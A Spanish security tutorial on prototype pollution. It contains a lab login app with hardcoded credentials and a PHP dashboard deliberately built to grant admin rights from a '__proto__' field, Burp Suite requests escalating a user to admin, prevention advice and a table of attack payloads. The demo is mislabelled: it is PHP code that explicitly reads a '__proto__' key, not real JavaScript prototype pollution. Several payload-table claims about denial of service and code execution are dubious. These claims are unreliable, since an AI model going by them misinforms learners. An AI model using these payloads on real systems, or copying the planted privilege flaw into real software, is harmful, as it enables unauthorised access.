---
icon: smog
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Prototype Pollution (Contaminación de prototipos) JavaScript

## Practica de explotación `Prototype Pollution`

Imaginemos que tenemos esta pagina de aqui:

> index.php

```php
<?php
session_start();

// Verificar si el usuario ya está autenticado
if (isset($_SESSION['user'])) {
    // Si el usuario ya está autenticado, redirigimos al Dashboard
    header('Location: dashboard.php');
    exit;
}

// Verificar si los datos del formulario fueron enviados
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Simulación de una base de datos de usuarios
    $users = [
        'user' => 'user123', // Usuario normal
        'admin' => 'admin123', // Usuario administrador
    ];

    // Verificar las credenciales
    if (isset($users[$username]) && $users[$username] === $password) {
        // Si las credenciales son correctas, guardamos el nombre de usuario en la sesión
        $_SESSION['user'] = $username;

        // Redirigimos al Dashboard
        header('Location: dashboard.php');
        exit;
    } else {
        // Si las credenciales son incorrectas
        $error_message = "Usuario o contraseña incorrectos.";
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        //<!-- ESTILO_PAGINA -->
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Iniciar sesión</h1>

        <?php if (isset($error_message)): ?>
            <p class="error-message"><?php echo $error_message; ?></p>
        <?php endif; ?>

        <form action="index.php" method="POST">
            <label for="username">Usuario:</label>
            <input type="text" name="username" id="username" required>

            <label for="password">Contraseña:</label>
            <input type="password" name="password" id="password" required>

            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
```

> dashboard.php

```php
<?php
session_start();

// Verificar si el usuario está logueado
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

$user = $_SESSION['user'];

// Procesar la solicitud JSON si es un POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);

    // Inicializamos la respuesta con los datos base
    $response = [
        "username" => $data['username'],
        "password" => $data['password'],
        "isAdmin" => false,  // Por defecto, el usuario no es admin
    ];

    // Verificamos si el JSON contiene `__proto__`
    if (isset($data['__proto__']) && is_array($data['__proto__'])) {
        foreach ($data['__proto__'] as $key => $value) {
            $response[$key] = $value;
        }
    }

    // Si `isAdmin` fue añadido a través de `__proto__`, elevar privilegios
    if (isset($response['isAdmin']) && $response['isAdmin'] === true) {
        $_SESSION['user'] = 'admin';
        $response['username'] = 'admin';
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <style>
        //<!-- ESTILO_PAGINA -->
    </style>
</head>
<body>
    <div class="dashboard-container">
        <h2>Bienvenido, <?= htmlspecialchars($user) ?>!</h2>

        <?php if ($user === 'admin'): ?>
            <p>¡Eres un administrador!</p>
            <a href="upload.php">
                <button class="admin-button">Cambiar foto de perfil</button>
            </a>
	   <br><br><br>
        <?php else: ?>
            <p>¡Eres un usuario normal!</p>
        <?php endif; ?>

        <form id="profileForm" onsubmit="sendProfileUpdate(event)">
            <h3>Modificar perfil</h3>
            <label for="username">Nuevo usuario:</label>
            <input type="text" name="username" id="username" value="<?= htmlspecialchars($user) ?>" required>

            <label for="password">Nueva contraseña:</label>
            <input type="password" name="password" id="password" required>

            <button type="submit">Actualizar perfil</button>
        </form>

        <a href="logout.php" class="logout">Cerrar sesión</a>
    </div>
    <script src="backend.js" defer></script>
</body>
</html>
```

Vemos que en el `dashboard.php` esta la vulnerabilidad de que se puede realizar un `Prototype Pollution`, vamos abrir `BurpSuite`, pero antes de estar a la escucha de cualquier peticion vamos a iniciar sesion con el usuario por defecto de la pagina `user:user123`.

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

Veremos este apartado, dentro de este mismo apartado vamos a ponernos a la escucha con `BurpSuite` y capturaremos la peticion de `Actualizar perfil` y veremos la siguiente peticion:

```
POST /dashboard.php HTTP/1.1
Host: app.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://app.dl/dashboard.php
Content-Type: application/json
Content-Length: 37
Origin: http://app.dl
Connection: keep-alive
Cookie: PHPSESSID=neokpt9n1876qjdr7j946q5kl2
Priority: u=0

{
	"username":"user",
	"password":"user"
}
```

Ahora vamos a cambiarlo para intentar añadir una variable inventada y ver si se puede contaminar:

```
POST /dashboard.php HTTP/1.1
Host: app.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://app.dl/dashboard.php
Content-Type: application/json
Content-Length: 37
Origin: http://app.dl
Connection: keep-alive
Cookie: PHPSESSID=neokpt9n1876qjdr7j946q5kl2
Priority: u=0

{
    "username": "user",
    "password": "user123",
    "__proto__":{ 
	    "var": "test" 
	}
}
```

Ahora si enviamos esta peticion y activamos antes de enviarla en `BurpSuite` la respuesta del servidor para ver como se esta procesando:

<figure><img src="../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

Ahora lo enviaremos y veremos lo siguiente en la respuesta del servidor o lo podremos enviar al `Repeater` con `Ctrl+R` que es mucho mas recomendable:

```
HTTP/1.1 200 OK
Date: Wed, 12 Mar 2025 13:24:03 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 69
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{
    "username": "user",
    "password": "user123",
    "isAdmin":false,
    "var":"test"
}
```

Veremos que se esta añadiendo correctamente y a parte estamos viendo que esta realizando una validacion de si es `admin` o no en el parametro `"isAdmin":false`, vamos a probechar eso sabiendo que esta ese parametro y que podemos modificarlo de la siguiente forma:

Vamos a volver a capturar la peticion y hacer esto:

```
POST /dashboard.php HTTP/1.1
Host: app.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://app.dl/dashboard.php
Content-Type: application/json
Content-Length: 37
Origin: http://app.dl
Connection: keep-alive
Cookie: PHPSESSID=neokpt9n1876qjdr7j946q5kl2
Priority: u=0

{
    "username": "user",
    "password": "user123",
    "__proto__":{ 
	    "isAdmin":true 
	}
}
```

Y veremos que nos responde con esto:

```
HTTP/1.1 200 OK
Date: Wed, 12 Mar 2025 13:24:03 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 69
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{
    "username": "user",
    "password": "user123",
    "isAdmin":true
}
```

Ahora si nos vamos a la pagina veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

Veremos que hemos conseguido ser el usuario `admin` con esta vulnerabilidad.

## Explicación detallada de `Prototype Pollution`

### **Vulnerabilidad Prototype Pollution**

**Definición:** La vulnerabilidad de **Prototype Pollution** (Polución del prototipo) ocurre cuando un atacante manipula el prototipo de un objeto JavaScript a través de entradas de usuario no validadas. En JavaScript, los objetos heredan propiedades de su prototipo. Si un atacante es capaz de alterar estas propiedades del prototipo, podría modificar el comportamiento de todo el objeto y afectar el comportamiento de la aplicación, causando consecuencias severas como la corrupción de datos, la denegación de servicio (DoS) e incluso la ejecución de código no autorizado.

En el contexto de una aplicación web, si los datos del usuario no se validan correctamente antes de ser utilizados para manipular objetos JavaScript, el atacante puede inyectar claves y valores en el prototipo de los objetos, lo que afecta a todas las instancias de esos objetos.

**¿Cómo funciona?** En JavaScript, los objetos pueden tener un prototipo que define propiedades y métodos compartidos por todas sus instancias. Si un atacante puede modificar el prototipo de un objeto, puede agregar propiedades globales a todos los objetos derivados de ese prototipo. Esto puede tener efectos inesperados, como sobrescribir métodos importantes, manipular datos o crear condiciones de error.

Por ejemplo, si un atacante inyecta una propiedad como `__proto__` en un objeto, este será propagado a todas las instancias de ese objeto, afectando su comportamiento.

### **Ejemplo de Prototype Pollution:**

Imagina un sistema que toma la entrada del usuario y la usa para crear objetos, como un formulario donde un usuario envía datos que luego son procesados por el servidor. Si un atacante envía un objeto con una propiedad maliciosa como `__proto__`, esto afectará al comportamiento de otros objetos dentro de la aplicación.

**Código vulnerable en JavaScript:**

```js
let userInput = req.body; // Un ejemplo de entrada del usuario
let obj = {};
Object.assign(obj, userInput); // El input se asigna al objeto

console.log(obj.someProperty); // Puede causar comportamiento inesperado
```

Si el atacante envía el siguiente payload en `userInput`:

```json
{
  "__proto__": { "isHacked": true }
}
```

Ahora, el prototipo del objeto ha sido alterado, lo que significa que cualquier objeto que se derive de `obj` heredará la propiedad `isHacked`, incluso si no se define en el objeto original.

***

### **Impactos de la vulnerabilidad Prototype Pollution:**

1. **Sobrescribir propiedades de objetos importantes:** Un atacante puede modificar o eliminar propiedades de objetos importantes, como las propiedades del objeto `window` o `document` en un entorno del lado del cliente.
2. **Denegación de servicio (DoS):** La manipulación del prototipo puede llevar a la aplicación a un estado inconsistente, lo que podría provocar errores y caídas de la aplicación.
3. **Ejecución de código malicioso:** En algunos casos, la polución del prototipo podría desencadenar la ejecución de código malicioso si se manipulan funciones del prototipo como `eval` o `Function`.
4. **Modificación de la lógica de la aplicación:** La manipulación de prototipos puede cambiar el comportamiento general de la aplicación, haciendo que se comporten de maneras inesperadas.
5. **Escalada de privilegios o evasión de controles de acceso:** Al sobrescribir propiedades o métodos de objetos, los atacantes podrían eludir ciertas políticas de seguridad y controles de acceso de la aplicación.

***

### **Cómo prevenir la vulnerabilidad Prototype Pollution:**

1. **Validar y sanear todas las entradas del usuario:** Asegúrate de que las entradas proporcionadas por los usuarios no contengan claves maliciosas como `__proto__`, `constructor` o `prototype`. Esto puede hacerse mediante un proceso de validación exhaustivo.
2. **Usar bibliotecas seguras:** Utiliza bibliotecas que manejan la validación de objetos y que previenen la polución de prototipos. Algunas bibliotecas, como `lodash`, han actualizado sus versiones para mitigar la vulnerabilidad de `Prototype Pollution`.
3. **Evitar la manipulación directa del prototipo:** No permitas que el input del usuario pueda modificar el prototipo de objetos globales. Siempre verifica y limita las claves que se pueden asignar a un objeto.
4. **Uso de métodos que no permiten la manipulación del prototipo:** Métodos como `Object.create(null)` pueden usarse para evitar que los objetos tengan un prototipo, eliminando la posibilidad de manipular su prototipo.
5. **Monitoreo de la actividad de la aplicación:** Implementar medidas de seguridad y monitoreo que puedan detectar ataques basados en polución del prototipo, como revisiones de logs y alertas cuando se intenten modificar propiedades críticas del prototipo.

***

### **Tabla de Payloads y Bypasses para Prototype Pollution**

Aquí tienes algunos **payloads comunes y bypasses** utilizados para explotar vulnerabilidades de Prototype Pollution en aplicaciones JavaScript, junto con explicaciones de cómo funcionan y cómo se pueden utilizar.

| **Descripción**                                      | **Payload/Bypass**                                                | **Explicación**                                                                                                                                  |
| ---------------------------------------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Inyección de propiedad proto (común)**             | `{ "__proto__": { "isHacked": true } }`                           | Este payload agrega una propiedad al prototipo de los objetos. Puede afectar a todas las instancias de objetos derivados.                        |
| **Inyección de propiedad constructor**               | `{ "constructor": { "isHacked": true } }`                         | Manipula el `constructor` de un objeto, lo que puede afectar las instancias del objeto y el comportamiento de la aplicación.                     |
| **Inyección de propiedad prototype**                 | `{ "prototype": { "isHacked": true } }`                           | Manipula el prototipo de los objetos, afectando su comportamiento en la aplicación.                                                              |
| **Inyección en objetos complejos**                   | `{ "user": { "__proto__": { "isHacked": true } } }`               | Permite la manipulación del prototipo dentro de objetos anidados, afectando solo a las instancias anidadas.                                      |
| **Manipulación del objeto global (Window)**          | `{ "__proto__": { "alert": "You are hacked!" } }`                 | Este payload puede sobrescribir las funciones del objeto `window` en el lado del cliente, lo que puede ejecutar código malicioso.                |
| **Payload para desbordamiento de pila (DoS)**        | `{ "__proto__": { "x": "y" } }`, repetido muchas veces            | Puede desbordar la pila al tratar de modificar el prototipo de muchos objetos al mismo tiempo, causando un DoS.                                  |
| **Inyección de método malicioso (Ejecutar código)**  | `{ "__proto__": { "eval": "console.log('Executed!')" } }`         | Inyecta un método malicioso en el prototipo, lo que podría ejecutarse si se evalúan los objetos o se llaman métodos globales.                    |
| **Inyección de objeto completo en prototype**        | `{ "__proto__": { "__proto__": {} } }`                            | Inyección recursiva de prototipos, donde el prototipo se modifica en múltiples niveles.                                                          |
| **Manipular funciones internas (DoS)**               | `{ "__proto__": { "toString": "function() { return 'DoS'; }" } }` | Manipula el método `toString` del prototipo para cambiar el comportamiento de los objetos y hacer que el sistema entre en un estado inestable.   |
| **Manipular la propiedad proto de objetos internos** | `{ "__proto__": { "toString": "alert('Attacked!')" } }`           | Permite manipular funciones internas del objeto `toString`, lo que puede dar lugar a la ejecución de un código malicioso en el lado del cliente. |

***

### **Protección contra Prototype Pollution**

1. **Validación de Entradas:** Asegúrate de que las entradas no contengan claves críticas como `__proto__`, `constructor`, o `prototype`, y valida correctamente todas las entradas antes de usarlas en objetos o estructuras de datos.
2. **Uso de bibliotecas seguras:** Utiliza bibliotecas que ya estén protegidas contra la polución del prototipo, como la versión más reciente de **Lodash** o **Underscore**, que han mitigado este tipo de vulnerabilidad en sus funciones de manipulación de objetos.
3. **Revisión de código y monitoreo:** Implementa un sistema de monitoreo para detectar intentos de manipulación del prototipo, como la verificación de logs de acceso y la implementación de alertas ante entradas sospechosas.
4. **Uso de `Object.create(null)` para objetos sin prototipo:** Al crear objetos sin un prototipo, puedes evitar la posibilidad de que el atacante manipule el prototipo global y afecte todo el sistema.

***

### **Conclusión**

La vulnerabilidad de **Prototype Pollution** es una amenaza seria en aplicaciones JavaScript, ya que permite a los atacantes manipular el comportamiento de los objetos de la aplicación, lo que puede tener efectos devastadores como la ejecución de código no autorizado, la corrupción de datos o incluso ataques de denegación de servicio (DoS). Para mitigar esta vulnerabilidad, es crucial validar correctamente las entradas, usar bibliotecas seguras y evitar la manipulación directa de los prototipos de objetos globales.
